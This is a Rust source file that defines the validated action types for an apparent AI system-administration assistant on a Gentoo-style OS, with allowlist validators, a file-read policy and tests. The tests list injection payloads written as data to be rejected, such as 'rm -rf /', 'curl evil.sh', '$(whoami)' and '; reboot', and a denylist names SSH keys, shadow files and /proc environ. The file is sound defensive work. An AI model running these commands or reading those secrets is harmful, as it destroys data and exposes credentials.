//! The closed set of actions Hadal may propose, and the types that make an
//! invalid one unrepresentable.
//!
//! # The rule this file enforces
//!
//! The model never gets a shell. There is no code path from a generation to a
//! command interpreter. What the model produces is JSON; what this module
//! produces is a validated `Action`; what the executor receives is a typed
//! struct it turns into an explicit argv or a D-Bus method call.
//!
//! `EmergeApply` holds `Vec<Atom>`, not a command string. `RestartUnit` holds
//! a `UnitName`, not arguments to `systemctl`. Those newtypes have no public
//! constructor that skips validation, and they deserialize through
//! `TryFrom<String>` — so **parsing is validation**. A malformed atom does not
//! produce a suspicious `Action`; it produces no `Action` at all, and the
//! proposal is dropped before it is ever shown to the user.
//!
//! Shell metacharacters are excluded structurally rather than by escaping:
//! every validator is an allowlist over characters, so `;`, `$(`, backticks,
//! newlines and NUL are unrepresentable rather than quoted.

use serde::{Deserialize, Serialize};
use std::fmt;
use std::path::{Component, Path, PathBuf};

use crate::capability::Capability;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InvalidValue(String);

impl fmt::Display for InvalidValue {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}
impl std::error::Error for InvalidValue {}

fn reject(msg: impl Into<String>) -> InvalidValue {
    InvalidValue(msg.into())
}

// ─────────────────────────────────────────────────────────────────────────
// Package atoms
// ─────────────────────────────────────────────────────────────────────────

/// A Portage package atom, e.g. `sys-boot/limine`, `>=dev-lang/rust-1.82`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct Atom(String);

const ATOM_MAX: usize = 200;

impl Atom {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl TryFrom<String> for Atom {
    type Error = InvalidValue;

    fn try_from(raw: String) -> Result<Self, Self::Error> {
        if raw.is_empty() || raw.len() > ATOM_MAX {
            return Err(reject(format!("atom length out of range: {}", raw.len())));
        }

        // Strip a leading version operator; the remainder must be a plain atom.
        let body = ["<=", ">=", "<", ">", "=", "~"]
            .iter()
            .find_map(|op| raw.strip_prefix(*op))
            .unwrap_or(&raw);

        if body.is_empty() {
            return Err(reject("atom is only an operator"));
        }

        // Allowlist. Anything a shell would find interesting is absent by
        // construction — this is why the executor never needs to quote.
        if let Some(bad) = body
            .chars()
            .find(|c| !(c.is_ascii_alphanumeric() || matches!(c, '+' | '_' | '-' | '.' | '/' | ':')))
        {
            return Err(reject(format!("illegal character {bad:?} in atom")));
        }

        if body.contains("..") {
            return Err(reject("atom contains '..'"));
        }

        // Split off ::repo before counting slashes, since a repo suffix has none.
        let (pkg, _repo) = match body.split_once("::") {
            Some((p, r)) if !r.is_empty() => (p, Some(r)),
            Some(_) => return Err(reject("empty repository suffix")),
            None => (body, None),
        };

        // Slot may follow the package name.
        let (cat_pkg, _slot) = match pkg.split_once(':') {
            Some((p, s)) if !s.is_empty() => (p, Some(s)),
            Some(_) => return Err(reject("empty slot")),
            None => (pkg, None),
        };

        let mut parts = cat_pkg.split('/');
        let category = parts.next().unwrap_or_default();
        let name = parts.next().unwrap_or_default();
        if parts.next().is_some() {
            return Err(reject("atom has more than one '/'"));
        }
        if category.is_empty() || name.is_empty() {
            return Err(reject("atom must be category/name"));
        }
        // A leading '-' would be read as an option by anything we hand this to.
        if category.starts_with('-') || name.starts_with('-') {
            return Err(reject("atom component starts with '-'"));
        }

        Ok(Atom(raw))
    }
}

impl From<Atom> for String {
    fn from(a: Atom) -> String {
        a.0
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Unit names
// ─────────────────────────────────────────────────────────────────────────

const UNIT_SUFFIXES: &[&str] = &[
    ".service", ".socket", ".timer", ".target", ".mount", ".automount", ".path", ".slice",
    ".scope", ".swap",
];

/// A systemd unit name. Must carry a recognised suffix — bare names are
/// rejected rather than defaulted to `.service`, because guessing what the
/// model meant is exactly the wrong instinct here.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct UnitName(String);

impl UnitName {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl TryFrom<String> for UnitName {
    type Error = InvalidValue;

    fn try_from(raw: String) -> Result<Self, Self::Error> {
        if raw.is_empty() || raw.len() > 256 {
            return Err(reject(format!("unit name length out of range: {}", raw.len())));
        }
        if raw.starts_with('-') {
            return Err(reject("unit name starts with '-'"));
        }
        if raw.contains("..") || raw.contains('/') {
            return Err(reject("unit name contains a path component"));
        }
        if let Some(bad) = raw
            .chars()
            .find(|c| !(c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '@' | ':' | '\\')))
        {
            return Err(reject(format!("illegal character {bad:?} in unit name")));
        }
        if !UNIT_SUFFIXES.iter().any(|s| raw.ends_with(s)) {
            return Err(reject("unit name lacks a recognised suffix"));
        }
        Ok(UnitName(raw))
    }
}

impl From<UnitName> for String {
    fn from(u: UnitName) -> String {
        u.0
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Paths
// ─────────────────────────────────────────────────────────────────────────

/// A syntactically acceptable absolute path.
///
/// Deliberately *only* syntactic. Whether this path may actually be read is a
/// policy question answered by [`PathPolicy::resolve`] at execution time,
/// against the canonicalised path — because a check performed at parse time
/// would be answering a question about a symlink that could since have moved.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct SafePath(PathBuf);

impl SafePath {
    pub fn as_path(&self) -> &Path {
        &self.0
    }
}

impl TryFrom<String> for SafePath {
    type Error = InvalidValue;

    fn try_from(raw: String) -> Result<Self, Self::Error> {
        if raw.is_empty() || raw.len() > 4096 {
            return Err(reject("path length out of range"));
        }
        if raw.contains('\0') {
            return Err(reject("path contains NUL"));
        }
        let p = PathBuf::from(&raw);
        if !p.is_absolute() {
            return Err(reject("path is not absolute"));
        }
        if p.components().any(|c| matches!(c, Component::ParentDir)) {
            return Err(reject("path contains '..'"));
        }
        Ok(SafePath(p))
    }
}

impl From<SafePath> for String {
    fn from(p: SafePath) -> String {
        p.0.to_string_lossy().into_owned()
    }
}

/// Decides which files Hadal may read.
///
/// Two independent gates, and the order matters: the denylist is consulted
/// *after* canonicalisation and applies regardless of the allowlist. That
/// redundancy is the point — it means widening `roots` carelessly, in a config
/// file, months from now, still cannot expose a private key.
pub struct PathPolicy {
    roots: Vec<PathBuf>,
}

impl Default for PathPolicy {
    fn default() -> Self {
        Self {
            roots: [
                "/var/log",
                "/var/tmp/portage",
                "/var/db/repos",
                "/etc/portage",
                "/etc/hadalos",
                "/usr/share/doc",
            ]
            .iter()
            .map(PathBuf::from)
            .collect(),
        }
    }
}

/// Never readable, no matter what the allowlist says.
fn is_denied(path: &Path) -> bool {
    let s = path.to_string_lossy();

    const DENIED_SEGMENTS: &[&str] = &["/.ssh/", "/.gnupg/", "/private/", "/shadow", "/gshadow"];
    const DENIED_SUFFIXES: &[&str] = &[".key", ".pem", ".p12", ".pfx", "shadow", "id_rsa", "id_ed25519"];

    if s.starts_with("/proc/") || s.starts_with("/sys/") {
        return true;
    }
    if DENIED_SEGMENTS.iter().any(|seg| s.contains(seg)) {
        return true;
    }
    let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    if DENIED_SUFFIXES.iter().any(|suf| name.ends_with(suf)) {
        return true;
    }
    false
}

impl PathPolicy {
    pub fn with_roots(roots: Vec<PathBuf>) -> Self {
        Self { roots }
    }

    /// Canonicalise, then check. Returns the resolved path on success.
    pub fn resolve(&self, path: &SafePath) -> Result<PathBuf, InvalidValue> {
        let canonical = std::fs::canonicalize(path.as_path())
            .map_err(|e| reject(format!("cannot resolve path: {e}")))?;

        // Symlinks are followed by canonicalize, so a link inside an allowed
        // root pointing at /etc/shadow lands here as /etc/shadow and fails
        // both gates below.
        if is_denied(&canonical) {
            return Err(reject("path is on the permanent denylist"));
        }
        if !self.roots.iter().any(|r| canonical.starts_with(r)) {
            return Err(reject("path is outside every permitted root"));
        }

        let meta = std::fs::symlink_metadata(&canonical)
            .map_err(|e| reject(format!("cannot stat path: {e}")))?;
        if !meta.is_file() {
            return Err(reject("path is not a regular file"));
        }

        Ok(canonical)
    }
}

// ─────────────────────────────────────────────────────────────────────────
// Action parameters
// ─────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum BootRef {
    #[default]
    Current,
    Previous,
}

impl BootRef {
    pub fn as_journalctl_arg(self) -> &'static str {
        match self {
            BootRef::Current => "0",
            BootRef::Previous => "-1",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum EmergeMode {
    #[default]
    Install,
    Oneshot,
    Depclean,
}

/// Configuration changes are an enum, not a key/value pair.
///
/// A generic "write this key" action would be a config-file-shaped shell: the
/// model picks the file and the content, and the broker becomes a text editor
/// with root. Each supported change is instead a named operation with typed
/// operands, so the executor knows precisely which file it is touching and in
/// what format.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "kebab-case")]
pub enum ConfigChange {
    /// Append to /etc/portage/package.use/hadalos
    PortageUse { atom: Atom, flags: Vec<UseFlag> },
    /// Append to /etc/portage/package.accept_keywords/hadalos
    PortageAcceptKeywords { atom: Atom, keyword: Keyword },
    /// Append to /etc/portage/package.mask/hadalos
    PortageMask { atom: Atom },
}

impl ConfigChange {
    pub fn summary(&self) -> String {
        match self {
            ConfigChange::PortageUse { atom, flags } => {
                let f: Vec<&str> = flags.iter().map(|x| x.as_str()).collect();
                format!("set USE flags on {}: {}", atom.as_str(), f.join(" "))
            }
            ConfigChange::PortageAcceptKeywords { atom, keyword } => {
                format!("accept keyword {} for {}", keyword.as_str(), atom.as_str())
            }
            ConfigChange::PortageMask { atom } => format!("mask {}", atom.as_str()),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct UseFlag(String);

impl UseFlag {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl TryFrom<String> for UseFlag {
    type Error = InvalidValue;
    fn try_from(raw: String) -> Result<Self, Self::Error> {
        let body = raw.strip_prefix('-').unwrap_or(&raw);
        if body.is_empty() || body.len() > 64 {
            return Err(reject("USE flag length out of range"));
        }
        if !body
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '_' | '-' | '+'))
        {
            return Err(reject("illegal character in USE flag"));
        }
        Ok(UseFlag(raw))
    }
}

impl From<UseFlag> for String {
    fn from(f: UseFlag) -> String {
        f.0
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct Keyword(String);

impl Keyword {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl TryFrom<String> for Keyword {
    type Error = InvalidValue;
    fn try_from(raw: String) -> Result<Self, Self::Error> {
        // ~amd64, amd64, **. Nothing else is worth supporting from a model.
        const ALLOWED: &[&str] = &["amd64", "~amd64", "**"];
        if ALLOWED.contains(&raw.as_str()) {
            Ok(Keyword(raw))
        } else {
            Err(reject(format!("unsupported keyword: {raw}")))
        }
    }
}

impl From<Keyword> for String {
    fn from(k: Keyword) -> String {
        k.0
    }
}

// ─────────────────────────────────────────────────────────────────────────
// The action enum
// ─────────────────────────────────────────────────────────────────────────

fn default_lines() -> u32 {
    200
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "action", rename_all = "kebab-case", deny_unknown_fields)]
pub enum Action {
    ReadJournal {
        #[serde(default)]
        unit: Option<UnitName>,
        #[serde(default)]
        boot: BootRef,
        #[serde(default = "default_lines")]
        lines: u32,
    },
    ReadPortageLog {
        path: SafePath,
    },
    ReadPath {
        path: SafePath,
    },
    QueryPackage {
        atom: Atom,
    },
    UnitStatus {
        unit: UnitName,
    },
    EmergePretend {
        atoms: Vec<Atom>,
    },
    RestartUnit {
        unit: UnitName,
    },
    EmergeApply {
        atoms: Vec<Atom>,
        #[serde(default)]
        mode: EmergeMode,
    },
    WriteConfig {
        change: ConfigChange,
    },
    NetworkLookup {
        query: String,
    },
}

impl Action {
    /// The action's own identity, distinct from its capability. Several
    /// actions can share a capability, so a client rendering a proposal needs
    /// both: the capability says what is being permitted, the action id says
    /// what is being done.
    pub fn id(&self) -> &'static str {
        match self {
            Action::ReadJournal { .. } => "read-journal",
            Action::ReadPortageLog { .. } => "read-portage-log",
            Action::ReadPath { .. } => "read-path",
            Action::QueryPackage { .. } => "query-package",
            Action::UnitStatus { .. } => "unit-status",
            Action::EmergePretend { .. } => "emerge-pretend",
            Action::RestartUnit { .. } => "restart-unit",
            Action::EmergeApply { .. } => "emerge-apply",
            Action::WriteConfig { .. } => "write-config",
            Action::NetworkLookup { .. } => "network-lookup",
        }
    }

    pub fn capability(&self) -> Capability {
        match self {
            Action::ReadJournal { .. } => Capability::ReadJournal,
            Action::ReadPortageLog { .. } => Capability::ReadPortageLog,
            Action::ReadPath { .. } => Capability::ReadPath,
            Action::QueryPackage { .. } => Capability::QueryPackage,
            Action::UnitStatus { .. } => Capability::UnitStatus,
            Action::EmergePretend { .. } => Capability::EmergePretend,
            Action::RestartUnit { .. } => Capability::RestartUnit,
            Action::EmergeApply { .. } => Capability::EmergeApply,
            Action::WriteConfig { .. } => Capability::WriteConfig,
            Action::NetworkLookup { .. } => Capability::NetworkLookup,
        }
    }

    /// One line, shown verbatim in the confirmation prompt. The user is
    /// authorising *this*, not the model's prose about it.
    pub fn summary(&self) -> String {
        match self {
            Action::ReadJournal { unit, boot, lines } => match unit {
                Some(u) => format!("read {lines} journal lines for {} ({boot:?} boot)", u.as_str()),
                None => format!("read {lines} journal lines ({boot:?} boot)"),
            },
            Action::ReadPortageLog { path } => {
                format!("read build log {}", path.as_path().display())
            }
            Action::ReadPath { path } => format!("read {}", path.as_path().display()),
            Action::QueryPackage { atom } => format!("look up {}", atom.as_str()),
            Action::UnitStatus { unit } => format!("check status of {}", unit.as_str()),
            Action::EmergePretend { atoms } => {
                format!("simulate emerge of {}", join_atoms(atoms))
            }
            Action::RestartUnit { unit } => format!("restart {}", unit.as_str()),
            Action::EmergeApply { atoms, mode } => {
                format!("emerge ({mode:?}) {}", join_atoms(atoms))
            }
            Action::WriteConfig { change } => change.summary(),
            Action::NetworkLookup { query } => format!("search online for {query:?}"),
        }
    }

    /// Structural limits applied after deserialisation — the things a type
    /// cannot express on its own.
    pub fn check_limits(&self) -> Result<(), InvalidValue> {
        const MAX_ATOMS: usize = 64;
        match self {
            Action::EmergePretend { atoms } | Action::EmergeApply { atoms, .. } => {
                if atoms.is_empty() {
                    return Err(reject("no packages given"));
                }
                if atoms.len() > MAX_ATOMS {
                    return Err(reject(format!("too many packages ({} > {MAX_ATOMS})", atoms.len())));
                }
            }
            Action::ReadJournal { lines, .. } => {
                if *lines == 0 || *lines > 10_000 {
                    return Err(reject("journal line count out of range"));
                }
            }
            Action::NetworkLookup { query } => {
                if query.is_empty() || query.len() > 512 {
                    return Err(reject("query length out of range"));
                }
            }
            Action::WriteConfig { change } => {
                if let ConfigChange::PortageUse { flags, .. } = change {
                    if flags.is_empty() || flags.len() > 32 {
                        return Err(reject("USE flag count out of range"));
                    }
                }
            }
            _ => {}
        }
        Ok(())
    }
}

fn join_atoms(atoms: &[Atom]) -> String {
    atoms.iter().map(|a| a.as_str()).collect::<Vec<_>>().join(" ")
}

// ─────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn atom(s: &str) -> Result<Atom, InvalidValue> {
        Atom::try_from(s.to_string())
    }
    fn unit(s: &str) -> Result<UnitName, InvalidValue> {
        UnitName::try_from(s.to_string())
    }
    fn path(s: &str) -> Result<SafePath, InvalidValue> {
        SafePath::try_from(s.to_string())
    }

    #[test]
    fn accepts_real_atoms() {
        for good in [
            "sys-boot/limine",
            ">=dev-lang/rust-1.82",
            "=sys-kernel/hadalos-sources-7.2.0",
            "dev-libs/openssl:0",
            "gui-wm/hadalwm::hadalos",
            "app-misc/foo-1.2.3_p4",
        ] {
            assert!(atom(good).is_ok(), "should accept {good}");
        }
    }

    /// The whole point of the newtype. Every one of these is a command
    /// injection if it reaches an argv or a shell.
    #[test]
    fn rejects_injection_shaped_atoms() {
        for bad in [
            "sys-boot/limine; rm -rf /",
            "sys-boot/limine && curl evil.sh",
            "$(whoami)/pkg",
            "`id`/pkg",
            "sys-boot/limine\nworld",
            "sys-boot/limine world",
            "--sync",
            "-froot/pkg",
            "sys-boot/../../etc/pkg",
            "a/b/c",
            "noslash",
            "",
            "|/pkg",
            "sys-boot/limine\0",
        ] {
            assert!(atom(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn atom_length_is_bounded() {
        let long = format!("cat/{}", "a".repeat(ATOM_MAX));
        assert!(atom(&long).is_err());
    }

    #[test]
    fn accepts_real_units() {
        for good in ["hadald.service", "getty@tty1.service", "boot.mount", "hadal-app.socket"] {
            assert!(unit(good).is_ok(), "should accept {good}");
        }
    }

    #[test]
    fn rejects_bad_units() {
        for bad in [
            "hadald",                    // no suffix: do not guess
            "hadald.service; reboot",
            "../../etc/passwd.service",
            "/etc/systemd/system/x.service",
            "--user.service",
            "hadald.service\n",
        ] {
            assert!(unit(bad).is_err(), "should reject {bad:?}");
        }
    }

    #[test]
    fn rejects_traversal_and_relative_paths() {
        assert!(path("/var/log/portage/../../etc/shadow").is_err());
        assert!(path("relative/path").is_err());
        assert!(path("/var/log/x\0y").is_err());
        assert!(path("/var/log/portage/build.log").is_ok());
    }

    #[test]
    fn denylist_covers_secrets_inside_permitted_roots() {
        assert!(is_denied(Path::new("/etc/shadow")));
        assert!(is_denied(Path::new("/home/u/.ssh/id_ed25519")));
        assert!(is_denied(Path::new("/etc/hadalos/tls.key")));
        assert!(is_denied(Path::new("/proc/1/environ")));
        assert!(!is_denied(Path::new("/var/log/portage/build.log")));
    }

    #[test]
    fn keywords_are_a_fixed_set() {
        assert!(Keyword::try_from("~amd64".to_string()).is_ok());
        assert!(Keyword::try_from("~arm64".to_string()).is_err());
        assert!(Keyword::try_from("*".to_string()).is_err());
    }

    #[test]
    fn use_flags_reject_metacharacters() {
        assert!(UseFlag::try_from("systemd".to_string()).is_ok());
        assert!(UseFlag::try_from("-wayland".to_string()).is_ok());
        assert!(UseFlag::try_from("x; rm -rf /".to_string()).is_err());
        assert!(UseFlag::try_from("$(id)".to_string()).is_err());
    }

    /// A malformed proposal must produce *no* action, never a partially
    /// trusted one.
    #[test]
    fn malformed_json_yields_no_action() {
        assert!(serde_json::from_str::<Action>(r#"{"action":"emerge-apply"}"#).is_err());
        assert!(serde_json::from_str::<Action>(
            r#"{"action":"emerge-apply","atoms":["sys-boot/limine; id"]}"#
        )
        .is_err());
        assert!(serde_json::from_str::<Action>(r#"{"action":"exec","cmd":"sh"}"#).is_err());
        // deny_unknown_fields: no smuggling extra operands past the executor.
        assert!(serde_json::from_str::<Action>(
            r#"{"action":"restart-unit","unit":"hadald.service","extra":"--now"}"#
        )
        .is_err());
    }

    #[test]
    fn well_formed_proposal_round_trips() {
        let a: Action = serde_json::from_str(
            r#"{"action":"emerge-apply","atoms":["sys-boot/limine",">=dev-lang/rust-1.82"],"mode":"oneshot"}"#,
        )
        .expect("should parse");
        assert_eq!(a.capability(), Capability::EmergeApply);
        assert!(a.check_limits().is_ok());
        assert!(a.summary().contains("sys-boot/limine"));
    }

    #[test]
    fn limits_reject_absurd_batches() {
        let atoms: Vec<String> = (0..100).map(|i| format!("cat/pkg{i}")).collect();
        let json = serde_json::json!({ "action": "emerge-apply", "atoms": atoms });
        let a: Action = serde_json::from_value(json).unwrap();
        assert!(a.check_limits().is_err());
    }

    #[test]
    fn every_action_maps_to_a_capability() {
        // Guards against a new variant being added without a capability.
        let samples = [
            r#"{"action":"read-journal"}"#,
            r#"{"action":"read-portage-log","path":"/var/log/portage/x.log"}"#,
            r#"{"action":"read-path","path":"/etc/portage/make.conf"}"#,
            r#"{"action":"query-package","atom":"sys-boot/limine"}"#,
            r#"{"action":"unit-status","unit":"hadald.service"}"#,
            r#"{"action":"emerge-pretend","atoms":["sys-boot/limine"]}"#,
            r#"{"action":"restart-unit","unit":"hadald.service"}"#,
            r#"{"action":"emerge-apply","atoms":["sys-boot/limine"]}"#,
            r#"{"action":"write-config","change":{"kind":"portage-mask","atom":"sys-boot/limine"}}"#,
            r#"{"action":"network-lookup","query":"limine bls"}"#,
        ];
        assert_eq!(samples.len(), Capability::ALL.len());
        for s in samples {
            let a: Action = serde_json::from_str(s).unwrap_or_else(|e| panic!("{s}: {e}"));
            let _ = a.capability();
            assert!(!a.summary().is_empty());
        }
    }
}
